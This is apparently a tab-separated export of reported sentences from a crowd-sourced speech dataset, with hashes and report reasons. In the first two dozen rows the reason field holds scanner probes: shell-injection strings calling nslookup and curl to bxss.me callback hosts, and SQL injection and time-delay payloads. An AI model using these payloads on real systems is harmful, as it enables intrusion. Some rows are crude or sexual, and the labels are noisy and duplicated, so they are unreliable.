Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	|(nslookup -q=cname hithigfilqoitc2b00.bxss.me||curl hithigfilqoitc2b00.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	`(nslookup -q=cname hiterpbeyanwl4b9ea.bxss.me||curl hiterpbeyanwl4b9ea.bxss.me)`
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	;(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)|(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)&(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	apS1EgpO
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1 OR 2+645-645-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1 OR 2+150-150-1=0+0+0+1
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1' OR 2+485-485-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1' OR 2+28-28-1=0+0+0+1 or 'sWcFAjSS'='
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1" OR 2+128-128-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	if(now()=sysdate(),sleep(15),0)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1 waitfor delay '0:0:15' -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	TqX7I5Gx'; waitfor delay '0:0:15' -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	IPhutiFJ' OR 684=(SELECT 684 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	peYnjJTx') OR 153=(SELECT 153 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	7GoA03g1')) OR 157=(SELECT 157 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1'"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	@@DtTzO
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
Lysenko, Columbia Univ.	de4e8215d69472433a90ccb16c05e6fbba8ab9741befae13434e58bbc266859b	en	grammar-or-spelling
The water chain appears to be a conserved feature of cyt f.	ddeb4adc5e30fd65d73f6df0da0c6781a8ddf7deecfdbe531b7aae66036c3799	en	grammar-or-spelling
Mrs. Reid appeared behind the bar.	de5b49ad9afc58dd602fcb8333a4e9915330e3babb196c9a9d86a54be70c0021	en	grammar-or-spelling
کچھ کھانے کی خواہش ہے؟ 
	59e732d0ff65777ff81fbfd01d67f8c1f585e97369d3e7b462004a9342db674a	en	sc-different-language
. زندگی کو بے فکری سے گزاریں۔	5a90cd1b9619453524b1e62ac539689af4f349d14526fe7ae997f81699386df0	en	sc-different-language
آپ کا نام کیا ہے؟
	5b429861462cb47813b65a2ed45cc2a329f99a74619f65ad26526996153c21a9	en	sc-different-language
. اپنے اہم لکشیوں کو برآمد کریں۔
	5b9246c4e295d5bed521c9c625b8c59f63e6ee658fe01b46801d96fef11c2e32	en	sc-different-language
کتابوں کی خریداری کرنی ہے.
	5ffebd83e041195f1b8fcbfe14b89f452e94bbab9d4b76557e4f6eed3ce22281	en	sc-different-language
کچھ لذیذ کھانا پسند ہے.
	60807f66b662f0c0022451b3f56fd66589afd674df0adcc69cc203ad6ada3eb2	en	sc-different-language
اتنی جلدی کیوں؟	611fa41107f25e4de26e370c4b05026b231107a4fb2b5f609c5270049ac857e5	en	sc-different-language
برف باری بہت خوبصورت ہے.
	612d5c8d6c6349f4c421290ab7e2847c0b0208fe731498317c1bfc5ef1e999e2	en	sc-different-language
دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔

	61764a05edcf105d3a6f17a550858f73c5490b8237ef163aa68b96894b7021ae	en	sc-different-language
وہ اپنی ماں کا ساتھ ہے.
	617d927918e24eca20e18e4516d637d83d964d810f426e28634538ebe25f6407	en	sc-different-language
Frieze (textile)	ded4c4711d9cbb19f54035e04623b278c811845bd7d10fc60d7669e78b595aa7	en	grammar-or-spelling
He completed Phd.	ded93e571accb840d077a4475f1aa855f2613ce7aa73650f0a0ba7117195e617	en	grammar-or-spelling
The construction was carried out by Fr.	dedc09d90c40c251717101e90b048bb8e6166f8e88617056f9a62f11493e16c4	en	grammar-or-spelling
Like all stations in the Market Street Subway, Embarcadero has a tri-level configuration.	df37c1964a0e9ae64f8495ed9ec60eff43df2ce7c324b4eb6486f03c8253ebc4	en	difficult-pronounce
During this period he accompanied Maximilian on his Bohemian campaign.	df2ee0a73b3fb90ed359d6bdacab6e5aca63397a2c1439e6198257fa3673abee	en	difficult-pronounce
Most staphylinoids are middle-sized or small beetles with a pair of shortened elytra.	df37fe75e49ae223de28acb070dea8213ad31d834aef7201ecad18a4c091d549	en	difficult-pronounce
Manumaleuna recorded a season-high four receptions against the Green Bay Packers.	def13f02ffa444f163ab94b38a62d3e647b942501076ed9665a0f29015b5e369	en	difficult-pronounce
Please do not touch my penis. 	22494f3988b0022d454d8a49b1c78a535048fa970b0c25dc286d831df3636c4d	en	Mentioned touching penis
اتنی جلدی کیوں؟	611fa41107f25e4de26e370c4b05026b231107a4fb2b5f609c5270049ac857e5	en	sc-different-language
برف باری بہت خوبصورت ہے.
	612d5c8d6c6349f4c421290ab7e2847c0b0208fe731498317c1bfc5ef1e999e2	en	sc-different-language
دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔

	61764a05edcf105d3a6f17a550858f73c5490b8237ef163aa68b96894b7021ae	en	sc-different-language
وہ اپنی ماں کا ساتھ ہے.
	617d927918e24eca20e18e4516d637d83d964d810f426e28634538ebe25f6407	en	sc-different-language
اے  اللہ ھمیں سیدھا راستہ دِکھاـ	627cde71fce0c7707f0a905a4b526248b2020c96bad48ae6b4465daa966959c2	en	sc-different-language
Maldives Structural Products Pvt.	df3938ed6cf5df7b96a6a3f3c0490489dee4a0884456e5468166a6a6512a0490	en	grammar-or-spelling
I want you to cum inside me!	676a52b2a6d26768bd2521a0fe81cbc4bd19470cc0924b892a0a7244367eafd7	en	offensive-language
He did not remarry, although he had illegitimate children with his mistress.	df67d1c0b22084dcdbe7192e0c37f95b01fd2160a9455e6e3398b8c970fc1a35	en	CBDGFSREDA ,LOP NB BVHGFDTDRFRGRTRFDCVSREDSAW12
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
Bis kurz vor Exitus.	6d1de9c9c01ab997e6aa3ffead6ca79cc3565f1935316ea7a224f416c60971be	en	sc-different-language
یہ کتاب بہت مفہوم ہے.
	6e2732fd60355818af1e09b14c849f630011fe9fbba8624c442dfc2fc3ae7baa	en	sc-different-language
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔	6e49f5f101a7b700880d7d4aad8184561f6dd25f51198a46c5f134ae8b3af61b	en	sc-different-language
. زندگی کو اپنے اہم مقاصد تک پہنچائیں۔
	6f03abcaafff7c93552aa8c80418d0f58259d44c9af1036e761b83455a562161	en	sc-different-language
ان کی میہندی کل منائی جائے گی۔ 
	704c80187d6f30c40a1ca684839e20aadfc54b53ca58fd6a382b596bc672d3e4	en	sc-different-language
کامیابی کی راہوں پر اقدام بڑھائیں اور مقصد تک پہنچیں۔

	7072c68770632444d5a812a7b47a969e69dbee5843f3d9f3c0e32c2982d9b03a	en	sc-different-language
. محبت کا اظہار خوشبوداری کی طرف راہتا ہے۔
	7097f3ed893b1da4e4acce0a323f5b654a6d318aa9097d19138826f9b011d552	en	sc-different-language
برائے مہربانی قیمت کو تھوڑا کم کریں۔
	70bcbe617256154750a2684de43e8a9fc8ca2c91c2c80e93600a53fda335187d	en	sc-different-language
میں اپنی کتاب دھوندتا ہوں.
	70f74c540ec9ec938940df51c630fb69784201033f7a835fe26c1e221bc3e22b	en	sc-different-language
We should read books 	f222a44380dd537fd70517e9ca8cbf7c1114f28f2b941f1bebfdd56b1c25ba04	en	.
The O'Connor family enjoys hiking, scuba diving, music, and travel.	dfb2d44b2f23b959349fc37da763edcac2ddff3a0919980758a56afc7d52c680	en	different-language
The lyrics are unrelated to the Mets or baseball generally.	dfe86dce847fa8d740f7723d68555d5edc7c09e88167fcf7e0affaa64ac5c4b4	en	ciao
Suraj Mal at "Britannica"	dfd8ad27ca24596943e9fe491d26bd06719cc447b3560db0c3f89055de7d699d	en	.
Aesthetics studies the concepts of "beauty" and "harmony.	e0101b09ae8f67e97e8b0fd43a0fe6f1055cc222f8f1b5eb5715d6c371b20766	en	"
Andrew Gleason had no PhD, but considered Mackey to be his advisor.	dfe9a2ef7c767ed7b9fe38cceef0d741216d2eb85f009607336df644188beb8d	en	grammar-or-spelling
Torreense.	e01bfff782e21549600188dbbab4036d24b035fd9c965f6a712ae88bee4feefa	en	different-language
This production propelled the career of William Christie and his ensemble Les Arts Florissants.	e017a7d8b79a2274ceb0e2b36e6e4540e9656da91126bf885ec58d55185037a7	en	different-language
Fessendent received his early education at the Fryeburg Academy in his hometown.	df7e3baa6b6e4db9bed361b3df2a2fb4a36acd2caa6c54b4dc962dd00875a660	en	difficult-pronounce
Pontius Meropius Paulinus was born at Bordeaux, in southwestern France.	e01c7a061d60140cddb5739b35f8cab753732206054f95ef7debf7c5439f336c	en	difficult-pronounce
Blumlein envisaged introduction of surround sound in the film industry.	e009559c8afcdb8437bfed4b426bc0c9f422a57715c572b064ff7f029fec120f	en	difficult-pronounce
Anagnostakis' poetry has been described as "terse".	dfefb3f3f0fc0e03cb067eab3bd35c815115236b7aac4f639d245731b90e0017	en	difficult-pronounce
For this reason Thoth was universally worshipped by ancient Egyptian scribes.	dffee04072a5de95cc819108b44e6b036a5d4693754a0ce931283e1d7a173104	en	difficult-pronounce
If the connective nerve tissues in the trachea degenerate it causes tracheomalacia.	e00990495440f37bd87b57acdfcc0664a287e6d54fb8c0cac74b03eafb48db8f	en	difficult-pronounce
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	different-language
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	difficult-pronounce
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	grammar-or-spelling
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	offensive-language
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	good direction speaking
Excuses, ik heb nu even geen tijd, ik moet de kinderen van school halen.	5605e8d3d8fc91cac938e64693a8048295d7f3e8e42eb96c4f582af0f602ce6f	en	sc-different-language
Sentences contributed here will be added to a publicly available licensed dataset	b240bd7734b69c3a43ac6b715c2f2915a243fc7563246cac22c7872080280091	en	.
Talk to a human	c0a43fa49fbf452ed09cbd4ce8f5b87502bf4b2aca5b1c549fab70a5ea9dfcd5	en	.
Tra i due litiganti il terzo gode	c1f740a930048a3921e195f69bf43cc9eb9471dbb972e553e915429aee7c7b41	en	sc-different-language
Fatal poisoning in humans is very rare, usually occurring after consuming yew foliage.	e10b2f02ec6848ef1c86f70b59498f2e6f668919118952b5e60142cd68bbd5f9	en	different-language
Fatal poisoning in humans is very rare, usually occurring after consuming yew foliage.	e10b2f02ec6848ef1c86f70b59498f2e6f668919118952b5e60142cd68bbd5f9	en	c
It means Fuck the Army.	e0f666aa9a3642b7cd8beac2a4006794b5c0b65ebcf918fcb23e4a751bda7c85	en	grammar-or-spelling
The son of Rev.	e0f8f91692f598a74eb6ffb1d14cbb9b4726dc83e3789ba1f96e70616528fd0e	en	grammar-or-spelling
Kaplan wove his New Yorker cartooning into "Seinfeld" with the episode, "The Cartoon.	e1078e61cb9320bcadba38b49f534fa0e6db1ad237489bcc6297650b4471d3c7	en	grammar-or-spelling
Kaplan wove his New Yorker cartooning into "Seinfeld" with the episode, "The Cartoon.	e1078e61cb9320bcadba38b49f534fa0e6db1ad237489bcc6297650b4471d3c7	en	"
Cite with a link or the full name of the work	142dcfc162bb69db1bf88a3cfe68f9fd605ef806a9dae91b80f9ce22189196a5	en	.
Wait, wait, wait! I have a surprise for you, open your bag.	59e4e32ed0d425d12a76ce8fccf79a050b836ba4b6126c4354d7227e18ec5923	en	grammar-or-spelling
it should be easy to read the sentence	6bd80f28a013e6e96e4021f6b31ccbb433d665d9dab554afbc220c5d426e5729	en	.
He later studied at the and began directing short films.	e03280180d32f835fb04fd53d6f25e411d445faca756824892d614630348f13a	en	grammar-or-spelling
This is a speech in natural language	c5f768744e3a657d1e3170d689ccf7995d3dc3110b7f2a518f71c1d44f9cb952	en	.
Excuses, ik heb nu even geen tijd, ik moet de kinderen van school halen.	5605e8d3d8fc91cac938e64693a8048295d7f3e8e42eb96c4f582af0f602ce6f	en	sc-different-language
Was hast du gemacht?	7497bc3b95bcb0e235a378f423f747b95416a26c7cfa220815738c0222b85107	en	sc-different-language
 دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔	77cb96ccfe537484f146e100f9d82bd20fe4a822138692e8d4b12024c7947d1b	en	sc-different-language
დაღამდა და მანქანებმა ქუჩა დატოვეს.	77f29e386679882e3936b4beab3815a74535b28486ef41e73225d5e1667fad80	en	sc-different-language
اپنی تعلیم اور دانائی کی قدر کریں۔	7819dd95057e560e3bce46b52c75e60cea338a381c3cf47d9a9354fa870a6d50	en	sc-different-language
کیا حماقت ہے؟	78a0c17eb91770672a8e6de44a139ee576988e1929c9e70572dfe0dca42ef642	en	sc-different-language
ہم سب دوست ہیں.
 	792d635c9d4431d7b01daeeb8d737bcafcc151b6d576f46d0f9662dda284cf79	en	sc-different-language
. تعلیم سے دلوں کو بھرنے کی طرف قدم بڑھائیں۔
	799fcabfcb1c840c8f8273cb1719795d13bd67f8d3405ea07298571bf25711ed	en	sc-different-language
. صحتیابی کی قدر کریں اور صحتیاب رہیں۔
	7a12e3de7c1531559fd77e4b3eb4a6a40e2b2230d41e6847e4b3f7b4d40392be	en	sc-different-language
. دوسروں کے ساتھ محبت سے پیش آئیں۔
	7a4c68e8ff09a37ca3b87a5adf88755461e0db820783fc873be6d405b793e450	en	sc-different-language
What am I going to do? I'm such a bad boomer.	a31bcb5b4d71fb67cba8351f732e81531283203a0e6221b87e385817b5acdb13	en	2 sentences
Pei and Samuel Balen.	e138cd2064269c104c262a55ed9a3fedd034c6a2392aecb766e208d76b5bfac4	en	offensive-language
तुम क्या कर रहे हो 	898c30b06a6bf449cba9efbe51b49e9130180e33e1e05661920b6a466ff50783	en	sc-different-language
Guys look better in Speedos, it's true!  Don't wear baggy board shorts.	064ecf4395eaed1ee6f0e6ec8de447d3ac434ef0501b7577a63d6eb65e1cbf19	en	grammar-or-spelling
Guys look better in Speedos, it's true!  Don't wear baggy board shorts.	064ecf4395eaed1ee6f0e6ec8de447d3ac434ef0501b7577a63d6eb65e1cbf19	en	2 sentences
Oh, ok. How much do I owe you? Do you need to?	8b87f031017a15f4a92a6dd2b89abacace966fc82c85f3bc6c8f9ce52094d81d	en	grammar-or-spelling
Mjafton ta kërkosh, ta klikosh dhe prenotosh!	96e7aa8f63dd6cb17cf58f50d6d992d02a6b2ee2939a5ab2948d8938a9767f73	en	sc-different-language
Hattori received a Ph.D. from Showa University.	e19e0cd4858857fa6b506484730262e2ae3c085a17714bc3e4a9601e201ed1ff	en	grammar-or-spelling
He studied philosophy under James Seth at Brown University where he earned his B.	e1a104543cb28f634e1471ba0f9f1d11f407e02a52678df3d09cf2510f86eddf	en	grammar-or-spelling
'Was it good, Mr. Forman? he asked me after every perfect shot.	e1a12e83b5f411bb5e00c5be033c700202218bdeff8f45cd1a33299b06a2727d	en	grammar-or-spelling
Confederate forces defeated the Union's only attempt to capture Charleston, South Carolina, by land.	e201fd917cae4c96b002b5dd2445e813008e68d59b6490cf46c21a985a492688	en	difficult-pronounce
The Greens are member of the European Green Party and the Global Greens.	e208157f7bf60bb90cbf5603a13275c23466b18d1b96d26c793566262bd14273	en	grammar-or-spelling
Men and women danced with thair arms round each other's waists.	8638715ac72daf8b9c1194b4d167fc462bde0cdc74a3780fa2431716f54ea1cc	en	grammar-or-spelling
The tree was shaking in the wind	86ffa9110cde737c5a9308392e08525e8d66f962f63bf3a27e8e84172d096ec4	en	.
John Koenig and music direction by Cpl.	e22460d0e24c189c99fac14e25ffb8fd80b41632fc8256bb7aa9dc00a3d832cd	en	grammar-or-spelling
At AaB, he quickly established himself as a playmaking midfielder.	e24390a2d08cf798431fdb50ba67f6cc429191c5392d19d3ba57ca8633f46d06	en	grammar-or-spelling
Alice said she no knowledge of the diamond.	e2558ea622011794d6b87438e9b08250ab117eee93f972a2647d1872585bb666	en	grammar-or-spelling
The is available in two editions.	e25741a31d3a7e80c630a8df7cfb08e0757b01cfaa703ba7ddf768ff7e4bc5e2	en	grammar-or-spelling
Service disruption affected the eastern route into Bangladesh while western one is not affected.	e24e8be7889ea33354b7c2758d1a54cd034da239d123596fadd033899de50ea9	en	grammar-or-spelling
She also won other award for her performance.	e2201138f852bda1deadf708c08a099367153ec579ecbdb0ff9addc92679a645	en	grammar-or-spelling
In the absence of a catalyst, the equilibrium is reached quite slowly.	e21704a6eeb08bbb79f84e709ce52cb509cfd695c80ed4b24b5ee3601a74a9c1	en	difficult-pronunciation
At the center of town, Mass.	e2678ba7e46f717f1b40b2146c520fd3cbf446f708079ec963708b3ebc532cd6	en	grammar-or-spelling
The map of biogeographic regions is deliberately simplified and ignores local anomalies.	e273476ac045f75345fa03b3fddede65f7325259b72db6a600a00d955a6c98c9	en	difficult-pronounce
The uyezd town was Torzhok.	e252eab8ebf44ef6013400685dc013dadbf222dbc86e80d6d63e46325b77bcd4	en	difficult-pronounce
However, Maserati dominated the early race with Menditeguy and Moss leading the field.	e273db4526890db88f1d388e445c6f24b0df066f60172f02e034a3a0054af701	en	difficult-pronounce
Tiomkin also paid careful attention to the voices of the actors when composing.	e26effec6db5d50b5e79efc8d632c0b9f1263495fa165e2f9da2c95dfcac6bb5	en	difficult-pronounce
According to other sources, he was the son of Belus and Achiroe.	e2712bad5c3635712f372b1b6701b624a9eb80fcb2fc0e6ba152dfa3c28aaf4c	en	difficult-pronounce
This was part of Alcibiades's plan to renew the war with Athens in Attica.	e2639635b017d5e6d381fb29bb7adb274ae638a3c21dc224ef14ada9eb47e913	en	difficult-pronounce
The uyezd town was Torzhok.	e252eab8ebf44ef6013400685dc013dadbf222dbc86e80d6d63e46325b77bcd4	en	difficult-pronounce
The president and trustess serve four-year terms and are elected at large.	e2516c9f6ebb123e7a61073b13e8c0c9066b24322c8d85533c2e4312caee1eb3	en	grammar-or-spelling
It was founded by the Socialist Party and Cymru Goch and some independents.	e2670ebacbd00adec2fb58a79b4d2b1aca08c1c369fb356c962b74f7c07de0a7	en	difficult-pronounce
Medieval, city view, sunset, lively marketplaces, traders, citizens, historical buildings, Charles Angrand style	aeefc11d30dbfedd49c121f1a91d57c5102369fa8a7e6d033f225fc9a81e2f6f	en	.
Taimens grow to huge sizes here; specimens weighing have been caught here.	e28905207c31019e7e35c109f6a534075c0ab8d2953414560d77b091046a4490	en	grammar-or-spelling
The commune is not extensive so it does not any division into districts.	e2902e93fbf6e508b37408ed42279bcefe2e4ad766cbee4342bffeda95626ed7	en	grammar-or-spelling
The site of the furnace is marked on Ordnance Survey maps.	e27a797aba7db9238345ee8864d0a576fe419dfb4968d9d8f1131f7ab20064b3	en	difficult-pronounce
A minimum sea level pressure of was recorded at the Hong Kong Royal Observatory.	e2b3b12280e362176f65583226a9a615db189f7f99faf7de5e33d9c48c4916b8	en	grammar-or-spelling
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	offensive-language
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	grammar-or-spelling
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	different-language
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	difficult-pronounce
Mjafton ta kërkosh, ta klikosh dhe prenotosh!	96e7aa8f63dd6cb17cf58f50d6d992d02a6b2ee2939a5ab2948d8938a9767f73	en	sc-different-language
हेलो मेरा नाम अभिषेक है।  आज मैं आपको Artificial  इंटेलिजेंस के बारे मैं बताऊंगा। 	9a4af5b88553ad1c613cc45382e6e87e4110bdecba2fc89b331b4d263e36b3a1	en	sc-different-language
ہمیں موسیقی پسند ہے.
	9a9d532bd923e390c0aa19d6e4d0c49ef51db8075fbc9e928bf1b1cd3e141360	en	sc-different-language
Bella has suffered from a pulmonary embolism for some time	9e43cab1955e47ae937f614ed475329bd62d2c1c97be1377f2b513b4070b1f9a	en	.
Have you been to the new ice cream shop in neighborhood?	9b6b658fd89629512915843228d05e86d145ba3534d07ee4fbd80601c1411526	en	grammar-or-spelling
In the winter, basketball and table tennis are offered for both boys and girls.	e346f4e9d526f847c7af6b6b9a0652f7c5be9358c617ee5232d88edd9f6c7c59	en	offensive-language
What makes a job in software engineering attractive?	9f6f800387768a22381db7d5f330b3d295fd807db73ec9967eba117370071b20	en	sc-different-language
Teste de linguagem
	9f7714192711248bee7676e9c3e5b8d34b7586d8a70ee9a6eb1f48773dc95cb9	en	sc-different-language
تمہیں پتا ہے؟ 	9f9c279a51514fff2b0c1d7713d0deb86022540320a0bda62d5566346c579ffb	en	sc-different-language
یک بازی برنامه‌نویسی با ربات‌های کوچک	9feeb28bfccc6001ff50b650ad98d4e40044c40b74af6fa3281f8f2d3515f73c	en	sc-different-language
. دوسروں کی ترسیل کو سمجھنے کی کوشش کریں۔
	a01d2aa5ca2337665889fe224d175911c37f0a35f4f4146f5f50a5480433f35b	en	sc-different-language
The tourists can have the tent has both bring their own tents or rental.	e34bb9b2010dd1f2b20904340a75eaf3755d09c5c511a7fee56c2db27d496f21	en	grammar-or-spelling
Maie Casey.	e34758811252b60256a0e9bf96911b18ac7d85ea5fdae5ba632d5184dba7c184	en	grammar-or-spelling
Ptolemy's deaths are animated in different ways, depending on the enemy who kills her.	e35973060c2f79c70334000f352beeb84e0b5cb1f4c1c05bb464b42f1c559880	en	difficult-pronounce
It is located about halfway between Amiens and Bapaume.	e358247e83e89804163f745b4fa75e5ad4e396d7ddf94d83a49b08660c5129ef	en	difficult-pronounce
The allophones of are quite complex.	e36e52f5e4d32b1b78a0c24927413a6ad525d0520fbdc6b0b306f0c448aa911f	en	grammar-or-spelling
اچھے پڑوسی اللہ کی نعمت ہوتے ھے ـ
	a2960db92b2d39663fb399ac0993aea7e07e38164ad0ea95e6a6f3e05658ccd3	en	sc-different-language
. اپنی تعلیم اور دانائی کی قدر کریں۔
	a42289999aa3e3bfe9eecea8729f91b83ed496ebae6a15f9565053c5e239d2a1	en	sc-different-language
اور بھلا درد کون سہتا ہے ـ	a456539f0251139e2f3c8d10c5d2fcdaecb1e8f6355bd8886e1729c130fd78aa	en	sc-different-language
شەو و ڕۆژ بووین بە گرفت	a464e7de86f07739904cb185f4f54689671a35ee7b69b429cf8ec5f000b8c156	en	sc-different-language
وہ روزانہ ورزش کرتا ہے.
	a4fd5ccac7e19cd4708ff9d8e1659c1652d9e215e63e4cccac7e8e6a811fe8da	en	sc-different-language
The allophones of are quite complex.	e36e52f5e4d32b1b78a0c24927413a6ad525d0520fbdc6b0b306f0c448aa911f	en	grammar-or-spelling
She sells sea shells by the seashore. The shells she sells are surely seashells.	ac16428eb8d7c952792a8fc7b6aa230ea65043fe1c664c64d648f3aa5c9d40a8	en	2 sentences
It's funny to think that someone you don't know wrote this sentence	b2d8352c6833e975e1619246dfae20e8d19a12196d5052bdc65f244ba5c0370e	en	.
Conveniently, the pyrotechnist lives near the fire station	b3ab05beb4cf20b2791a391204df0f033870b8bc24186f31c3a2723a203932db	en	.
The hedgehog ate a strawberry before going about his day	c39d5cdfca33145c80654ccebac2da02aa42b7523d6b4313f7bc3146ad7fcfe3	en	.
There was a rabbit in the house. He was hungry.	c5323b8d9a9e42fabfdf51b95c952bd5020d67ce29a2e0be0cf73ada1e99c8c8	en	grammar-or-spelling
There was a rabbit in the house. He was hungry.	c5323b8d9a9e42fabfdf51b95c952bd5020d67ce29a2e0be0cf73ada1e99c8c8	en	2 sentences
اَلثُّلَاثَاء اَلدَّامِي . . إِسْرَائِيل تَعْتَرِفُ بِأَشْرَسِ يَوْمٍ فِي مَعَارِكَ غَزَّةَ	dda2ffd1273bfe664d803d07c8d265b0b9d5d69803ae565276081a5783ad4d09	en	sc-different-language
All those officials were responsibility for the Solomons as well.	e363d095cf4bcf093235246e124aad9f7e57869b765aa5c8c1bb965344d284ab	en	grammar-or-spelling
